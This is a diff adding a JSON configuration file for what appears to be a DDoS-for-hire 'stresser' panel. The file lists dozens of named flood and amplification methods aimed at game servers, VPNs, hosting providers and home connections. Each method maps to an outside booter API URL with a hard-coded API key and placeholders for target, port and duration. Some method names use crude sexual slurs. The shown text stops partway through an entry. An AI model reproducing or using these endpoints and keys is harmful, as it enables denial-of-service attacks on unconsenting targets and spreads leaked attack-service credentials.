@@ -1,0 +1,1607 @@
+{
+     "Attacks" : [
+
+          {
+               "Name" : "home-sky",
+               "AttackName" : "HOME-SKY",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ldap-1200",
+               "AttackName" : "LDAP-1200",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-down",
+               "AttackName" : "NFO-DOWN",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dns-mixture",
+               "AttackName" : "DNS-MIXTURE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-riot",
+               "AttackName" : "OVH-RIOT",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-raped",
+               "AttackName" : "OVH-RAPED",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ovh-fuck",
+               "AttackName" : "OVH-FUCK",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "100up-riot",
+               "AttackName" : "100UP-RIOT",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-kill",
+               "AttackName" : "NFO-KILL",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "home-slap",
+               "AttackName" : "HOME-SLAP",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "home",
+               "AttackName" : "HOME",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "home-nuke",
+               "AttackName" : "HOME-NUKE",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "cldap-super",
+               "AttackName" : "CLDAP-SUPER",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=ECLIPSE-EQUINOX",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dns-super",
+               "AttackName" : "DNS-SUPER",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "ntp-super",
+               "AttackName" : "NTP-SUPER",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "cpu-eclipse",
+               "AttackName" : "CPU-ECLIPSE",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "100up-eclipse",
+               "AttackName" : "100UP-ECLIPSE",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "hydra-eclipse",
+               "AttackName" : "HYDRA-ECLIPSE",
+               "Description" : "",
+               "API" : "http://195.58.38.10/api.php?key=ECLIPSE-API=ONTOP=0196542&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "dns-x",
+               "AttackName" : "DNS-X",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "hype-nfov2",
+               "AttackName" : "HYPE-NFOV2",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "kill-all",
+               "AttackName" : "KILL-ALL",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "tcp-fucked",
+               "AttackName" : "TCP-FUCKED",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "tcp-riot",
+               "AttackName" : "tcp-drop",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "tcp-drop",
+               "AttackName" : "TCP-DROP",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "vpn-crush",
+               "AttackName" : "VPN-CRUSH",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "vpn-riot",
+               "AttackName" : "VPN-RIOT",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "vpn-killer",
+               "AttackName" : "VPN-KILLER",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "vpn-killerv2",
+               "AttackName" : "VPN-KILLERV2",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fortnite",
+               "AttackName" : "FORTNITE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fn-lag",
+               "AttackName" : "FN-LAG",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fortnite-sky",
+               "AttackName" : "FORTNITE-SKY",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "game-riot",
+               "AttackName" : "GAME-RIOT",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "game-rape",
+               "AttackName" : "GAME-RAPE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fn-rape",
+               "AttackName" : "FN-RAPE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "fn-fuck",
+               "AttackName" : "FN-FUCK",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "https-freeze",
+               "AttackName" : "HTTPS-FREEZE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "https-rip",
+               "AttackName" : "HTTPS-RIP",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "https-ice",
+               "AttackName" : "HTTPS-ICE",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=FREEZEV2",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "nfo-down",
+               "AttackName" : "NFO-DOWN",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "home-silly",
+               "AttackName" : "HOME-SILLY",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-silly",
+               "AttackName" : "HOME-SILLY",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-star",
+               "AttackName" : "HOME-STAR",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "psn-home",
+               "AttackName" : "PSN-HOME",
+               "Description" : "",
+               "API" : "https://api-casper.xyz/AllAPI.php?key=modzontop!-lifetime-until5&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "home-orphic",
+               "AttackName" : "HOME-ORPHIC",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ldap",
+               "AttackName" : "LDAP",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "dns",
+               "AttackName" : "DNS",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "snmp",
+               "AttackName" : "SNMP",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-killer",
+               "AttackName" : "OVH-KILLER",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-slap",
+               "AttackName" : "OVH-SLAP",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-orphic",
+               "AttackName" : "OVH-ORPHIC",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovh-orphicv2",
+               "AttackName" : "OVH-ORPHICV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "100up-portkill",
+               "AttackName" : "100UP-PORTKILL",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-xrs",
+               "AttackName" : "NFO-XRS",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-storm",
+               "AttackName" : "NFO-STORM",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-killer",
+               "AttackName" : "NFO-KILLER",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "nfo-killerv2",
+               "AttackName" : "NFO-KILLERV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-xv",
+               "AttackName" : "TCP-XV",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-storm",
+               "AttackName" : "TCP-STORM",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-bypass",
+               "AttackName" : "TCP-BYPASS",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-bypassv2",
+               "AttackName" : "TCP-BYPASSV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "kill-all",
+               "AttackName" : "KILL-ALL",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=KILL-ALL",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "kill-allv2",
+               "AttackName" : "KILL-ALLV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fivem-crush",
+               "AttackName" : "FIVEM-CRUSH",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fivem-crushv2",
+               "AttackName" : "FIVEM-CRUSHV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fivem-killer",
+               "AttackName" : "FIVEM-KILLER",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "game-storm",
+               "AttackName" : "GAME-STORM",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "GAME-STORMv2",
+               "AttackName" : "GAME-STORMV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fortnite",
+               "AttackName" : "FORTNITE",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fn-lag",
+               "AttackName" : "FN-LAG",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fn-freeze",
+               "AttackName" : "FN-FREEZE",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "cod-killer",
+               "AttackName" : "COD-KILLER",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "r6-ranked",
+               "AttackName" : "R6-RANKED",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "https-storm",
+               "AttackName" : "HTTPS-STORM",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "https-stormv2",
+               "AttackName" : "HTTPS-STORMV2",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "https-orphic",
+               "AttackName" : "HTTPS-ORPHIC",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fivem-gonexv",
+               "AttackName" : "FIVEM-GONEXV",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "http-get",
+               "AttackName" : "HTTP-GET",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "http-catch",
+               "AttackName" : "HTTP-CATCH",
+               "Description" : "",
+               "API" : "https://astrasecurityteam.xyz/stresser/api/api.php?key=rZRi0F18CNaaUftv&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : false
+          },
+          {
+               "Name" : "game-killall",
+               "AttackName" : "GAME-KILLALL",
+               "Description" : "",
+               "API" : "https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-vIz2piKfwoARHC8GjJFHtOvC9O4Oc0&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+               "DefaultPort" : "443",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "mixedhome",
